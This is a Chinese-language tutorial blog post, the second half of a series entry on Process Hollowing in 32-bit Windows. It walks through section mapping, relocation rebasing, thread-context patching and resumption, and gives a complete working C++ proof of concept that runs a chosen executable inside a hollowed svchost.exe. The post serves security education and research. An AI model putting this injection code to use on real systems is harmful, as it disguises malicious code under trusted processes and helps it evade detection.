# 【Day 21】薛丁格的 Process (下) - Process Hollowing

## 環境
* Windows 10 21H1
* Visual Studio 2019
* PE-bear v0.4.0.3

## 前情提要
在[【Day 20】薛丁格的 Process (上) - Process Hollowing](https://ithelp.ithome.com.tw/articles/10277670) 中我們列出整個 Process Hollowing 的實際流程，並且說明了前半部分。目前已經 Unmap 目標 Process 的 Image，並且把我們的檔案的 Header 放到目標 Process 中。

這篇就要接續上一篇的部分，從第 6 步開始講解。準備把 Section 也放進目標 Process，接著做 Rebase，最後執行被我們挖空竄改的 Process。

## 原理
### 實作流程
1. 建立一個 Suspended Process，它就是要被注入的目標 Process
2. 讀取要注入的檔案
3. Unmap 目標 Process 的記憶體
4. 在目標 Process 申請一塊記憶體
5. 把 Header 寫入目標 Process
6. 把各 Section 根據它們的 RVA 寫入目標 Process
7. Rebase Relocation Table，因為 Image Base 可能會不一樣
8. 取出目標 Process 的 Context，把暫存器 EAX 改成我們注入的程式的 Entry Point
9. 恢復執行原本狀態為 Suspended 的目標 Process

### 各步驟說明
#### 6. 把各 Section 根據它們的 RVA 寫入目標 Process
在第 5 步驟時，我們把注入的檔案的 Header 寫入目標 Process，接下來要把各 Section 也跟著寫入目標 Process。那檔案中總共有哪些 Section 呢，跟上一篇用同一張截圖，只是這次要寫入的目標是 Section 的部分。
![](https://i.imgur.com/wxKq8nu.png)

要把 Section 寫入前，要先了解 RVA(Relative Virtual Address) 的概念。簡單來說，`Section 在記憶體的實際位址 = Image Base + Section 的 RVA`。所以只要迴圈跑過所有 Section，把各 Section 的內容寫入各 Section 在記憶體的實際位址就完成了。

那要怎麼列舉所有 Section 呢？其實在第二步就有順便取出 Section Header 了，它就接在 NT Headers 的後面，所以只要 `NT Headers + sizeof(IMAGE_NT_HEADER32)` 就可以算出 Section Header。

#### 7. Rebase Relocation Table，因為 Image Base 可能會不一樣
這個步驟是我認為最複雜的，許多講解 Process Hollowing 的文章沒有把這步驟說明清楚，甚至有 [POC](https://github.com/idan1288/ProcessHollowing32-64/issues/1) 沒有做 Relocation。

在前面的步驟，我們已經把檔案的 Header 和 Section 都放到目標 Process 對應的位址了，不過還有最後的調整工作，就是 Rebase Relocation Table。先觀察一下這句組語 `mov eax, dword ptr [00400FFC]`，它就是需要做 Relocation 的範例，這句的意思是從 0x400FFC 的位址中取值並寫到暫存器 eax。然而 0x400FFC 這個位址是在 Image Base 為 0x400000 的情況下所產生出來的，但是現在由於目標 Process 跟檔案的 Image Base 不一定相同，所以需要做修正讓程式可以訪問正確的位址。

修正的方法不難，就是改 .reloc Section。首先要找到 .reloc Section，我們可以迴圈跑過所有 Section，確認 Section Name 是否為 .reloc。Relocation Table 結構也可以透過在 Optional Table 中的 DataDirectory 成員取得。

再來要了解 Relocation Table 的結構，Relocation Table 中會分為許多 Block(下圖紅色)，每個 Block 中又會有許多 Entry(下圖綠色)。在每個 Block 的開頭會有 PageAddress 與 BlockSize 兩個成員(下圖藍色)，其中 PageAddress 的值是以 Page(0x1000) 為單位遞增的，而我們需要改的位址就存在 `PageAddress + 每個 Entry 的 Offset` 中。
![](https://i.imgur.com/lxYQXPt.png)


所以在找到 Relocation 結構後，我們只要迴圈跑過所有 Entry，把每個 Entry 的 Offset 加上該 Block 的 PageAddress，將算出來的位址裡的值加上原本目標 Process 和檔案的 Image Base 的差，就可以完成 Rebase。
`*(檔案的 Image Base + PageAddress + Offset) += (目標 Process 的 Image Base) - (檔案的 Image Base)`

其中有個細節是 Entry 中的 Type，它只佔了 4 bit，是用來表示 Entry 的屬性。根據 [MSDN](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format)，當 Type 為 0 時代表它只是用來做 Padding 對齊用的，所以不用改。
![](https://i.imgur.com/hTqvzxq.png)


#### 8. 取出目標 Process 的 Context，把暫存器 EAX 改成我們注入的程式的 Entry Point
現在已經把我們要注入的檔案全部都寫進目標 Process 取代掉原本的了，接下來在讓目標 Process 繼續執行之前，要先改暫存器 EAX。目前的 EAX 存放的是原本 Image 的 Entry Point，如果不改它的話等等就會繼續從那執行，因此要把 EAX 改成我們程式的 Entry Point。

每個 Thread 都會有一組 [Context](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context) 結構，裡面存放暫存器資料，用 [GetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext) 可以得到目前 Thread 的 Context。把暫存器 EAX 寫成我們程式的 Entry Point 之後，用 [SetThreadContext](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) 更新 Context 就完成了。

#### 9. 恢復執行原本狀態為 Suspended 的目標 Process
用 [ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) 讓目前狀態為 Suspended 的目標 Process 繼續執行，由於前一個步驟修改了暫存器 EAX，因此執行的位址也會從我們程式的 Entry Point 開始繼續執行。

### 完整 POC
POC 改自 [m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)，只有加入一些註解並把一些非必要的程式拔掉減少篇幅。完整的程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/%E8%96%9B%E4%B8%81%E6%A0%BC%E7%9A%84Process/Process-Hollowing/sourcecode)。
```cpp=
void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{
    // 1. 建立一個 Suspended Process，它就是要被注入的目標 Process
    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

    // 第六個參數必須是 CREATE_SUSPENDED，因為需要它維持在初始狀態，讓我們能夠對其中的記憶體進行修改
    CreateProcessA
    (
        0,
        pDestCmdLine,		
        0, 
        0, 
        0, 
        CREATE_SUSPENDED, 
        0, 
        0, 
        pStartupInfo, 
        pProcessInfo
    );
    if (!pProcessInfo->hProcess)
    {
        printf("Error creating process\r\n");

        return;
    }

    // 取得 PEB，裡面包含後面步驟需要用到的 ImageBaseAddress
    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);


    // 2. 讀取要注入的檔案
    HANDLE hFile = CreateFileA
    (
        pSourceFile,
        GENERIC_READ, 
        0, 
        0, 
        OPEN_ALWAYS, 
        0, 
        0
    );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening %s\r\n", pSourceFile);
        return;
    }
    DWORD dwSize = GetFileSize(hFile, 0);
    PBYTE pBuffer = new BYTE[dwSize];
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

    // 取得 File Header 和 Optional Header
    // File Header 和 Optional Header 各是 NT Header 的其中一個成員，NT Header 則是從 DOS Header 算出來的
    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);


    // 3. Unmap 目標 Process 的記憶體
    // 從 ntdll.dll 中取出 NtUnmapViewOfSection
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    _NtUnmapViewOfSection NtUnmapViewOfSection =
        (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
    DWORD dwResult = NtUnmapViewOfSection
    (
        pProcessInfo->hProcess, 
        pPEB->ImageBaseAddress
    );
    if (dwResult)
    {
        printf("Error unmapping section\r\n");
        return;
    }


    // 4. 在目標 Process 申請一塊記憶體
    // Process 是目標 Process 的 Handle
    // lpAddress 是原本被 Unmap 的 Image 的 Base Address
    // dwSize 是我們要注入的檔案大小
    // flAllocationType　是　MEM_COMMIT | MEM_RESERVE
    // flProtect 可以針對不同的記憶體區段去做配置，不過 POC 方便起見，直接用 PAGE_EXECUTE_READWRITE
    PVOID pRemoteImage = VirtualAllocEx
    (
        pProcessInfo->hProcess,
        pPEB->ImageBaseAddress,
        pSourceHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!pRemoteImage)
    {
        printf("VirtualAllocEx call failed\r\n");
        return;
    }


    // 5. 把 Header 寫入目標 Process
    // 在改 Optional Header 中的 ImageBase 成員之前，算出檔案的 Image Base 和目標 Process 的 Image Base 的距離
    DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
    pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

    // 把我們的檔案 Header 寫入目標 Process
    if (!WriteProcessMemory
    (
        pProcessInfo->hProcess, 				
        pPEB->ImageBaseAddress, 
        pBuffer, 
        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
        0
    ))
    {
        printf("Error writing process memory\r\n");
        return;
    }

    /* 以上是薛丁格的 Process (上) 的內容 */
    /* 以下是薛丁格的 Process (下) 的內容 */

    // 6. 把各 Section 根據它們的 RVA 寫入目標 Process
    for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
    {
        if (!pSourceImage->Sections[x].PointerToRawData)
            continue;

        // Section 在記憶體的實際位址 = Image Base + Section 的 RVA
        PVOID pSectionDestination = (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);
        if (!WriteProcessMemory
        (
            pProcessInfo->hProcess,			
            pSectionDestination,			
            &pBuffer[pSourceImage->Sections[x].PointerToRawData],
            pSourceImage->Sections[x].SizeOfRawData,
            0
        ))
        {
            printf ("Error writing process memory\r\n");
            return;
        }
    }	

    // 7. Rebase Relocation Table，因為 Image Base 可能會不一樣
    if (dwDelta)
        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
        {
            // 確認 Section Name 是否為 .reloc
            char* pSectionName = ".reloc";		
            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
                continue;

            DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
            DWORD dwOffset = 0;

            // Relocation Table 結構可以透過在 Optional Table 中的 DataDirectory 成員取得
            IMAGE_DATA_DIRECTORY relocData = pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            // 迴圈跑過所有 Block
            while (dwOffset < relocData.Size)
            {
                PBASE_RELOCATION_BLOCK pBlockheader = (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];
                dwOffset += sizeof(BASE_RELOCATION_BLOCK);
                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);
                PBASE_RELOCATION_ENTRY pBlocks = (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

                // 迴圈跑過所有 Entry
                for (DWORD y = 0; y <  dwEntryCount; y++)
                {
                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                    // 當 Type 為 0 時代表它只是用來做 Padding 對齊用的，所以不用改
                    if (pBlocks[y].Type == 0)
                        continue;

                    // 把每個 Entry 的 Offset 加上所在的 Block 的 PageAddress，
                    // 將算出來的位址裡的值加上原本目標 Process 和檔案的 Image Base 的差
                    DWORD dwFieldAddress = 
                        pBlockheader->PageAddress + pBlocks[y].Offset;
                    DWORD dwBuffer = 0;
                    ReadProcessMemory
                    (
                        pProcessInfo->hProcess, 
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
                    );
                    dwBuffer += dwDelta;
                    BOOL bSuccess = WriteProcessMemory
                    (
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
                    );
                    if (!bSuccess)
                    {
                        printf("Error writing memory\r\n");
                        continue;
                    }
                }
            }
            break;
        }

    //  8. 取出目標 Process 的 Context，把暫存器 EAX 改成我們注入的程式的 Entry Point
    DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress + pSourceHeaders->OptionalHeader.AddressOfEntryPoint;
    LPCONTEXT pContext = new CONTEXT();
    pContext->ContextFlags = CONTEXT_INTEGER;
    if (!GetThreadContext(pProcessInfo->hThread, pContext))
    {
        printf("Error getting context\r\n");
        return;
    }
    pContext->Eax = dwEntrypoint;
    if (!SetThreadContext(pProcessInfo->hThread, pContext))
    {
        printf("Error setting context\r\n");
        return;
    }

    // 9. 恢復執行原本狀態為 Suspended 的目標 Process
    if (!ResumeThread(pProcessInfo->hThread))
    {
        printf("Error resuming thread\r\n");
        return;
    }
}
```

### 實際測試
把要注入的檔案，以專案提供的 HelloWorld.exe 為例，跟 ProcessHollowing.exe 放在同個目錄，執行 ProcessHollowing.exe 之後如果成功的話會跳出一個訊息框，用 Process Explorer 觀察會看到一個 32-bit svchost.exe，並且會發現它沒有載入 svchost.exe 的 Image，因為已經被我們 Unmap 了(詳見第 3 步驟)。
![](https://i.imgur.com/xvugxqN.png)

## 參考資料
* [PE 結構](https://www.cnblogs.com/Chary/p/12981261.html)
* [m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)
* [Windows Dll Injection、Process Injection、API Hook、DLL后门/恶意程序入侵技术](https://www.bbsmax.com/A/pRdBOwW6zn/)
* [十种注入技巧 | 通用性进程注入技巧研究看雪学院](https://zhuanlan.zhihu.com/p/28671064)
